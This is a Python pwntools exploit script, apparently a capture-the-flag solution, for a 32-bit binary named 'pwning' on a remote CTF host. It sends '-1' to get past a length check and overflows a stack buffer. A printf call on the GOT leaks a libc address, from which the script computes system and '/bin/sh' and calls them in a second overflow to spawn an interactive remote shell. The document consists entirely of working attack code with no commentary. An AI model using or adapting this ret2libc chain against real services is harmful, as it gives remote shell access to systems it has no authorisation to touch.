from pwn import *

#r=process("./pwning")
r=remote("ctf.j0n9hyun.xyz",3019)
context.log_level="debug"
b=ELF("./pwning")

pay=""
pay+='x'*0x2c
pay+='x'*4
pay+=p32(b.plt['printf'])
pay+=p32(b.symbols['vuln'])
pay+=p32(b.got['printf']) #print atoi 

r.sendline('-1')
r.recvuntil('!\n')
r.sendline(pay)
r.recvuntil('\n')

base=u32(r.recv(4))-0x49020
log.info(hex(base))
system=0x3a940+base
binsh=0x15902b+base

pay2=""
pay2+='x'*0x2c
pay2+='x'*4
pay2+=p32(system)
pay2+=p32(0x01010101)
pay2+=p32(binsh)

r.sendline('-1')
r.sendline(pay2)
r.interactive()
